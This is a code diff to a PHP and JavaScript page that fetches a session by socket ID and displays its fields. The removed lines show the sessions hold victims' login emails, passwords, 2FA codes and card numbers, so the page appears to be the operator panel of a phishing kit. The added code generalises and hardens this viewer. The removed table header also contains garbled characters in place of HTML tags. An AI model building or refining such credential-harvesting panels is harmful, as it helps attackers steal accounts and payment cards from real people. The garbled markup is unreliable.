@@ -28,26 +28,97 @@ if (!$socketId) {
         </div>
     </div>
     <script>
+    function escapeHtml(text) {
+        if (text === null || text === undefined) return '';
+        const div = document.createElement('div');
+        div.textContent = String(text);
+        return div.innerHTML;
+    }
+
+    function isMeaningfulValue(value) {
+        if (value === null || value === undefined) return false;
+        if (typeof value === 'string') return value.trim() !== '';
+        if (Array.isArray(value)) return value.some(isMeaningfulValue);
+        if (typeof value === 'object') return Object.values(value).some(isMeaningfulValue);
+        return true;
+    }
+
+    function formatFieldLabel(key) {
+        return String(key)
+            .replace(/([a-z0-9])([A-Z])/g, '$1 $2')
+            .replace(/[_-]+/g, ' ')
+            .replace(/\b\w/g, char => char.toUpperCase())
+            .replace(/\b2 Fa\b/g, '2FA')
+            .replace(/\bOtp\b/g, 'OTP')
+            .replace(/\bIp\b/g, 'IP')
+            .replace(/\bUrl\b/g, 'URL')
+            .replace(/\bId\b/g, 'ID');
+    }
+
+    function isTimeLikeField(key) {
+        return /(?:^|_)(time|date|at|seen|updated|created)$/i.test(String(key))
+            || ['created_at', 'last_seen'].includes(String(key));
+    }
+
+    function formatValue(key, value) {
+        if (isTimeLikeField(key)) {
+            const date = new Date(value);
+            return escapeHtml(isNaN(date.getTime()) ? 'Unknown' : date.toLocaleString());
+        }
+        if (typeof value === 'boolean') return value ? 'Yes' : 'No';
+        if (Array.isArray(value) || (value && typeof value === 'object')) {
+            return `<pre class="mb-0"><code>${escapeHtml(JSON.stringify(value, null, 2))}</code></pre>`;
+        }
+        return escapeHtml(String(value));
+    }
+
+    function collectEntries(session) {
+        const entries = [];
+        const seen = new Set();
+        const sources = [session];
+
+        if (session && session.data && typeof session.data === 'object' && !Array.isArray(session.data)) {
+            sources.push(session.data);
+        }
+
+        for (const source of sources) {
+            if (!source || typeof source !== 'object' || Array.isArray(source)) continue;
+
+            for (const [key, value] of Object.entries(source)) {
+                if (key === 'data' || seen.has(key) || !isMeaningfulValue(value)) continue;
+                seen.add(key);
+                entries.push([key, value]);
+            }
+        }
+
+        return entries;
+    }
+
     fetch(`/getSession?socketId=<?php echo urlencode($socketId); ?>`)
         .then(r => r.json())
         .then(data => {
-            if (data.success && data.data) {
-                const s = data.data;
-                let html = `<table class="table">汽<th>Field</th><th>Value</th>换
-                    <tr><td>Socket ID</td><td><code>${s.socketId}</code></td></tr>
-                    <tr><td>Domain</td><td>${s.domain || 'unknown'}</td></tr>
-                    <tr><td>IP</td><td>${s.clientIp || 'unknown'}</td></tr>
-                    <tr><td>Created</td><td>${new Date(s.created_at).toLocaleString()}</td></tr>
-                    <tr><td>Last Seen</td><td>${new Date(s.last_seen).toLocaleString()}</td></tr>
-                    ${s.profile_name ? `<tr><td>Name</td><td>${s.profile_name}</td></tr>` : ''}
-                    ${s.profile_email ? `<tr><td>Email</td><td>${s.profile_email}</td></tr>` : ''}
-                    ${s.login_email ? `<tr><td>Login Email</td><td>${s.login_email}</td></tr>` : ''}
-                    ${s.login_password ? `<tr><td>Password</td><td>${s.login_password}</td></tr>` : ''}
-                    ${s['2fa_code'] ? `<tr><td>2FA Code</td><td>${s['2fa_code']}</td></tr>` : ''}
-                    ${s.card_number ? `<tr><td>Card Number</td><td>${s.card_number}</td></tr>` : ''}
-                </table>`;
-                document.getElementById('details').innerHTML = html;
+            if (!data.success || !data.data) {
+                document.getElementById('details').innerHTML = '<div class="alert alert-danger mb-0">No session data found.</div>';
+                return;
             }
+
+            const rows = collectEntries(data.data).map(([key, value]) =>
+                `<tr><td>${escapeHtml(formatFieldLabel(key))}</td><td>${formatValue(key, value)}</td></tr>`
+            ).join('');
+
+            document.getElementById('details').innerHTML = `
+                <div class="table-responsive">
+                    <table class="table table-striped align-middle mb-0">
+                        <thead>
+                            <tr><th>Field</th><th>Value</th></tr>
+                        </thead>
+                        <tbody>${rows}</tbody>
+                    </table>
+                </div>
+            `;
+        })
+        .catch(error => {
+            document.getElementById('details').innerHTML = '<div class="alert alert-danger mb-0">' + escapeHtml(error.message) + '</div>';
         });
     </script>
 </body>
